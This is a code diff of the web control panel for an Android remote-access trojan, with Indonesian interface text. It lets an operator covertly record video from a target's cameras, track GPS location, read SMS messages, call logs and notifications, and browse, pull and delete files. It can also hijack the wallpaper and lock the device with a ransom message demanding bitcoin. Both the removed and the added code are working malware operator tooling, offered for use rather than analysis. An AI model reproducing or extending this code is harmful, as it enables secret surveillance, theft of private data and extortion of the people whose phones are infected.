-                            <button onclick="openModal('${currentModal}')" style="padding:6px 12px; font-size:0.8rem;">Jepret Lagi</button>
-                        </div>
-                    </div>`;
-                    footer.innerHTML = `<button onclick="closeModal()" style="background:var(--accent-secondary); color:white;">EXIT CAMERA MODE</button>`;
-                } else {
-                    body.innerHTML = `<div class="data-loader">
-                        <i class="fas fa-camera fa-pulse" style="font-size:3rem;color:var(--accent-secondary)"></i>
-                        <div class="mini-loader-bar"><div class="mini-loader-fill" style="width:100%"></div></div>
-                        <span>Capturing target...</span>
-                    </div>`;
-                }
-            }
-            else if (currentModal === 'gallery') {
-                const files = data.gallery?.files || [];
-                body.innerHTML = `<div class="gallery-grid">${files.map(f => `<div class="gallery-item"><img src="data:image/jpeg;base64,${f.thumbnail}"/><p>${f.name}</p></div>`).join('')}</div>`;
-                footer.innerHTML = `<button onclick="sendCommand('gallery back')">◀ Prev</button><span>page ${data.gallery?.page || 0}</span><button onclick="sendCommand('gallery next')">Next ▶</button>`;
-            }
-            else if (currentModal === 'lock') {
-                body.innerHTML = `
-                    <div style="text-align:center; padding:10px;">
-                        <h3 style="color:red; margin-bottom:15px;">⚠️ SYSTEM LOCK (RANSOMWARE)</h3>
-                        <p style="color:var(--text-dim); margin-bottom:5px;">Target Message:</p>
-                        <input id="lock-msg" placeholder="SYSTEM HACKED! PAY 1 BTC" style="width:100%; margin-bottom:15px;">
-                        <p style="color:var(--text-dim); margin-bottom:5px;">Unlock PIN:</p>
-                        <input id="lock-pin" placeholder="123456" type="number" style="width:100%; letter-spacing:4px; text-align:center;">
-                        <p style="font-size:0.7rem; color:orange; margin-top:10px;">Requires 'Display Over Other Apps' permission.</p>
-                    </div>`;
-                footer.innerHTML = `<button onclick="sendLockCommand()" style="background:red; color:white; width:100%;">🔒 LOCK TARGET DEVICE</button>`;
-            }
-            else if (currentModal === 'openurl') {
-                body.innerHTML = '<p>URL:</p><input id="url-text" value="https://" /><br>';
-                footer.innerHTML = `<button onclick="sendOpenUrl()">OPEN</button>`;
-            }
+            if (currentModal === 'lock') {
+                body.innerHTML = `<div style="text-align:center;padding:10px;"><input id="l-msg" placeholder="Target Message" style="margin-bottom:15px;"><input id="l-pin" placeholder="Unlock PIN" type="number" style="text-align:center;letter-spacing:5px;"></div>`;
+                footer.innerHTML = `<button onclick="sendLock()" style="background:red;">🔒 EXECUTE LOCK</button>`;
+            } 
             else if (currentModal === 'get_location') {
-                const url = data.location_url;
-                if (url) {
-                    // Extract coords
-                    const coords = url.split('q=')[1];
-                    const imgHtml = data.location_image ? 
-                        `<div style="margin-top:15px;">
-                            <h4 style="color:var(--accent-secondary); margin-bottom:8px;">📸 VISUAL CONFIRMATION</h4>
-                            <img src="${data.location_image}" style="width:100%; border-radius:18px; border:2px solid var(--accent-primary); box-shadow:0 0 20px var(--glow-primary);">
-                        </div>` : '';
-
-                    body.innerHTML = `
-                        <div style="text-align:center;">
-                            <iframe 
-                                width="100%" 
-                                height="250" 
-                                frameborder="0" 
-                                style="border:0; border-radius:12px; margin-bottom:10px;" 
-                                src="https://maps.google.com/maps?q=${coords}&z=15&output=embed">
-                            </iframe>
-                            <p style="color:var(--accent-primary); font-size:1.1rem; margin-bottom:10px;">
-                                <i class="fas fa-map-marker-alt"></i> ${coords}
-                            </p>
-                            <div style="display:flex; gap:10px;">
-                                <a href="${url}" target="_blank" style="flex:1; background:var(--surface-light); padding:8px 16px; border-radius:20px; text-decoration:none; color:white; border:1px solid var(--accent-primary); text-align:center;">
-                                    Google Maps ↗
-                                </a>
-                                <button onclick="sendCommand('stop_location')" style="flex:1; background:var(--accent-secondary); color:white;">🛑 STOP TRACKING</button>
-                            </div>
-                            ${imgHtml}
-                        </div>
-                    `;
-                    footer.innerHTML = `<button onclick="sendCommand('get_location')">Force Update Location</button>`;
-                } else {
-                    body.innerHTML = `
-                        <div class="data-loader">
-                            <i class="fas fa-satellite-dish fa-spin" style="font-size:3rem;color:var(--accent-secondary)"></i>
-                            <div class="mini-loader-bar"><div class="mini-loader-fill" style="width:60%"></div></div>
-                            <span>Triangulating GPS...</span>
-                        </div>
-                    `;
-                }
-            }
-            else if (currentModal === 'sms') {
-                const logs = data.sms_logs || [];
-                body.innerHTML = `<table><tr><th>sender</th><th>msg</th></tr>${logs.map(l => `<tr><td>${l.userSender}</td><td>${l.content}</td></tr>`).join('')}</table>`;
-            }
-            else if (currentModal === 'calls') {
-                const calls = data.call_logs || [];
-                body.innerHTML = `<table><tr><th>number</th><th>duration</th></tr>${calls.map(c => `<tr><td>${c.number}</td><td>${c.duration_seconds}s</td></tr>`).join('')}</table>`;
-            }
-            else if (currentModal === 'filemanager') {
-                const fm = data.file_manager || { path: '/', files: [] };
-                let html = `<div style="margin-bottom:10px; padding:8px; background:#0c1616; border-radius:12px; display:flex; justify-content:space-between; align-items:center;">
-                    <span style="color:var(--accent-primary); word-break:break-all;">📍 ${fm.path}</span>
-                    <button onclick="sendCommand('filemanager')" style="padding:4px 12px; font-size:0.7rem;">REFRESH</button>
-                </div><table>`;
-                
-                // Navigation Up - Only show if not at root
-                if (fm.path !== '/' && fm.path !== '') {
-                    html += `<tr><td colspan="2"><a href="#" onclick="sendCommand('cd ..'); return false;" style="color:var(--accent-secondary); text-decoration:none; display:block; padding:8px 0;">🔙 [parent directory]</a></td></tr>`;
-                }
-
-                // Sort: Folders first, then files
-                const sortedFiles = [...(fm.files || [])].sort((a, b) => (b.isDirectory - a.isDirectory) || a.name.localeCompare(b.name));
-
-                sortedFiles.forEach(f => {
-                    const icon = f.isDirectory ? '📁' : '📄';
-                    const color = f.isDirectory ? 'var(--accent-primary)' : 'var(--text)';
-                    if (f.isDirectory) {
-                        html += `<tr><td><a href="#" onclick="sendCommand('cd ${f.name}'); return false;" style="color:${color}; text-decoration:none; display:block; padding:4px 0;">${icon} ${f.name}</a></td>
-                                 <td style="text-align:right;"><button onclick="handleFmAction('delete', '${f.name}')" style="background:none; border:1px solid #ff3b9e; color:#ff3b9e; padding:2px 8px; font-size:0.6rem;">DEL</button></td></tr>`;
-                    } else {
-                        html += `<tr><td><span style="color:${color}">${icon} ${f.name}</span></td>
-                                 <td style="text-align:right;">
-                                    <button onclick="sendCommand('get ${f.name}')" style="background:none; border:1px solid var(--accent-primary); color:var(--accent-primary); padding:2px 8px; font-size:0.6rem;">GET</button>
-                                    <button onclick="handleFmAction('delete', '${f.name}')" style="background:none; border:1px solid #ff3b9e; color:#ff3b9e; padding:2px 8px; font-size:0.6rem;">DEL</button>
-                                 </td></tr>`;
-                    }
-                });
-                body.innerHTML = html + '</table>';
-                footer.innerHTML = `
-                    <button onclick="sendCommand('cd /')">ROOT</button>
-                    <button onclick="sendCommand('cd /storage/emulated/0')">SDCARD</button>
-                    <button onclick="document.getElementById('fm-upload').click()">UPLOAD</button>
-                    <input type="file" id="fm-upload" style="display:none" onchange="handleFmAction('upload', this)">
-                    <input placeholder="New Folder" id="fm-mkdir-input" style="width:110px; font-size:0.8rem; height:32px;">
-                    <button onclick="handleFmAction('mkdir')" style="padding:4px 12px;">MKDIR</button>
-                `;
-            }
-            else if (currentModal === 'notifications') {
-                const notifs = data.notifications || [];
-                body.innerHTML = `<table><tr><th>app</th><th>text</th></tr>${notifs.map(n => `<tr><td>${n.packageName}</td><td>${n.title} · ${n.text}</td></tr>`).join('')}</table>`;
-            }
-            else if (currentModal === 'apps') {
-                const apps = data.apps || [];
-                body.innerHTML = `<table><tr><th>app</th><th>action</th></tr>${apps.map(a => `<tr><td>${a.appName}</td><td><button onclick="sendCommand('run ${a.packageName}')">run</button></td></tr>`).join('')}</table>`;
+                if (data.location_url) {
+                    const coords = data.location_url.split('q=')[1];
+                    const imgHtml = data.location_image ? `<img src="${data.location_image}" style="width:100%;border-radius:18px;margin-top:15px;border:2px solid var(--accent-primary);">` : '';
+                    body.innerHTML = `<div style="text-align:center;"><iframe width="100%" height="250" frameborder="0" src="https://maps.google.com/maps?q=${coords}&z=15&output=embed"></iframe><p style="color:var(--accent-primary);margin:15px 0;">📍 ${coords}</p><div style="display:flex;gap:10px;"><a href="${data.location_url}" target="_blank" style="flex:1;border:1px solid;padding:10px;border-radius:30px;text-decoration:none;color:white;text-align:center;">Open Maps</a><button onclick="sendCommand('stop_location')" style="flex:1;background:var(--accent-secondary);">STOP</button></div>${imgHtml}</div>`;
+                } else { body.innerHTML = '<div style="text-align:center;padding:40px;"><i class="fas fa-satellite-dish fa-spin" style="font-size:3rem;color:var(--accent-secondary);"></i><p>Locating...</p></div>'; }
             }
             else if (currentModal === 'recorder') {
                 if (data.record_status === 'done' && data.last_video) {
-                    body.innerHTML = `
-                        <div style="text-align:center;">
-                            <h3 style="color:var(--accent-primary); margin-bottom:15px;">VIDEO CAPTURED</h3>
-                            <video width="100%" controls style="border-radius:18px; border:2px solid var(--accent-primary);">
-                                <source src="/captured_images/${data.last_video}" type="video/mp4">
-                            </video>
-                            <div style="margin-top:15px;">
-                                <a href="/captured_images/${data.last_video}" download style="color:var(--accent-primary); text-decoration:none; border:1px solid; padding:8px 16px; border-radius:20px;">💾 Download Video</a>
-                            </div>
-                        </div>`;
-                    footer.innerHTML = `<button onclick="openModal('recorder')" style="background:var(--accent-secondary);">REC AGAIN</button>`;
-                } else if (data.record_status) {
-                    body.innerHTML = `
-                        <div class="data-loader">
-                            <i class="fas fa-circle-notch fa-spin" style="font-size:3rem;color:red;"></i>
-                            <h3 style="margin-top:20px; color:red;">${data.record_status.toUpperCase()}</h3>
-                            <p style="color:var(--text-dim);">Silakan tunggu, sedang memproses data...</p>
-                        </div>`;
-                } else {
-                    body.innerHTML = `
-                        <div style="text-align:center; padding:20px;">
-                            <i class="fas fa-video" style="font-size:4rem; color:var(--accent-secondary); margin-bottom:20px;"></i>
-                            <h3>REMOTE VIDEO RECORDER</h3>
-                            <p style="color:var(--text-dim); margin-bottom:20px;">Pilih kamera untuk merekam video 10 detik secara sembunyi.</p>
-                            <div style="display:flex; gap:15px; justify-content:center;">
-                                <button onclick="sendCommand('record_front')" style="padding:15px 25px; flex:1;">📷 KAMERA DEPAN</button>
-                                <button onclick="sendCommand('record_back')" style="padding:15px 25px; flex:1;">📷 KAMERA BELAKANG</button>
-                            </div>
-                        </div>`;
-                }
+                    body.innerHTML = `<div style="text-align:center;"><video width="100%" controls style="border-radius:18px;border:2px solid var(--accent-primary);"><source src="/captured_images/${data.last_video}" type="video/mp4"></video><br><br><a href="/captured_images/${data.last_video}" download style="color:var(--accent-primary);text-decoration:none;border:1px solid;padding:10px 20px;border-radius:20px;">💾 Download Video</a></div>`;
+                } else if (data.record_status) { body.innerHTML = `<div style="text-align:center;padding:40px;"><i class="fas fa-circle-notch fa-spin" style="font-size:3rem;color:red;"></i><h3 style="margin-top:20px;color:red;">${data.record_status.toUpperCase()}</h3></div>`; }
+                else { body.innerHTML = `<div style="text-align:center;padding:20px;"><i class="fas fa-video" style="font-size:4rem;margin-bottom:20px;color:var(--accent-secondary);"></i><div style="display:flex;gap:15px;"><button onclick="sendCommand('record_front')">📷 FRONT</button><button onclick="sendCommand('record_back')">📷 BACK</button></div></div>`; }
             }
             else if (currentModal === 'wallpaper') {
-                body.innerHTML = `
-                    <div style="text-align:center; padding:10px;">
-                        <h3 style="color:var(--accent-primary); margin-bottom:15px;">HIJACK WALLPAPER</h3>
-                        <p style="color:var(--text-dim); margin-bottom:5px;">Image URL:</p>
-                        <input id="wp-url" placeholder="https://example.com/image.jpg" style="width:100%; margin-bottom:15px;">
-                        <p style="font-size:0.7rem; color:var(--text-dim);">Gunakan URL gambar langsung (Direct Link).</p>
-                    </div>`;
-                footer.innerHTML = `<button onclick="sendWallpaperCommand()" style="width:100%;">GANTI WALLPAPER TARGET</button>`;
+                body.innerHTML = `<div style="text-align:center;"><input id="wp-url" placeholder="Direct Image URL"></div>`;
+                footer.innerHTML = `<button onclick="sendWP()">HIJACK WALLPAPER</button>`;
+            }
+            else if (currentModal === 'sms') {
+                const logs = data.sms_logs || [];
+                body.innerHTML = `<table><tr><th>Sender</th><th>Message</th></tr>${logs.map(l => `<tr><td>${l.userSender}</td><td>${l.content}</td></tr>`).join('')}</table>`;
+            }
+            else if (currentModal === 'calls') {
+                const logs = data.call_logs || [];
+                body.innerHTML = `<table><tr><th>Number</th><th>Dur</th></tr>${logs.map(l => `<tr><td>${l.number}</td><td>${l.duration_seconds}s</td></tr>`).join('')}</table>`;
+            }
+            else if (currentModal === 'filemanager') {
+                const fm = data.file_manager || { path: '/', files: [] };
+                body.innerHTML = `<p style="color:var(--accent-primary);margin-bottom:10px;">📍 ${fm.path}</p><table>${fm.files.map(f => `<tr><td>${f.isDirectory ? '📁' : '📄'} ${f.name}</td><td><button onclick="sendCommand('get ${f.name}')" style="padding:4px 8px;font-size:0.7rem;">GET</button></td></tr>`).join('')}</table>`;
             }
         }
 
-        window.sendWallpaperCommand = () => {
-            const url = document.getElementById('wp-url')?.value;
-            if(url) { sendCommand(`set_wallpaper ${url}`); showPopup('info', 'Command sent: Updating wallpaper...'); closeModal(); }
-        };
+        window.sendLock = () => { sendCommand(`lock ${document.getElementById('l-msg').value || 'SYSTEM LOCKED'}|${document.getElementById('l-pin').value || '1234'}`); closeModal(); };
+        window.sendWP = () => { sendCommand(`set_wallpaper ${document.getElementById('wp-url').value}`); closeModal(); };
 
-        window.sendLockCommand = () => { 
-            const msg = document.getElementById('lock-msg')?.value || 'SYSTEM LOCKED';
-            const pin = document.getElementById('lock-pin')?.value || '1234';
-            sendCommand(`lock ${msg}|${pin}`); 
-            closeModal();
-        };
-
-        window.closeModal = () => {
-            if (currentModal === 'gallery') sendCommand('exit_gallery');
-            if (currentModal === 'filemanager') sendCommand('exit_shell');
-            if (currentModal === 'recorder') {
-                const data = clientDataCache[selectedClientId] || {};
-                if (data.last_video) {
-                    fetch('/api/delete_file', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ filename: data.last_video })
-                    });
+        async function pollStatus() {
+            try {
+                const res = await fetch('/api/status');
+                const data = await res.json();
+                state.devices = data.devices || [];
+                updateDeviceList();
+                if (selectedClientId) {
+                    const dres = await fetch(`/api/client_data/${selectedClientId}`);
+                    const cdata = await dres.json();
+                    clientDataCache[selectedClientId] = cdata;
+                    if (currentModal) renderModalContent();
+                    if (cdata.location_status === 'success' && lastDataHashes['loc'] !== cdata.location_url) { lastDataHashes['loc'] = cdata.location_url; showPopup('info', '🎯 TARGET TRACKED!'); }
+                    if (cdata.notifications?.length) {
+                        const n = cdata.notifications[0];
+                        if (!notificationHashes.has(selectedClientId + n.text)) { showPopup('info', `[${n.packageName}] ${n.title}: ${n.text}`); notificationHashes.add(selectedClientId + n.text); }
+                    }
                 }
-            }
-            document.getElementById('main-modal').style.display = 'none';
-            currentModal = null;
-        };
+            } catch (e) { console.error(e); }
+            setTimeout(pollStatus, 3000);
+        }
+        pollStatus();
     </script>
 </body>
 </html>
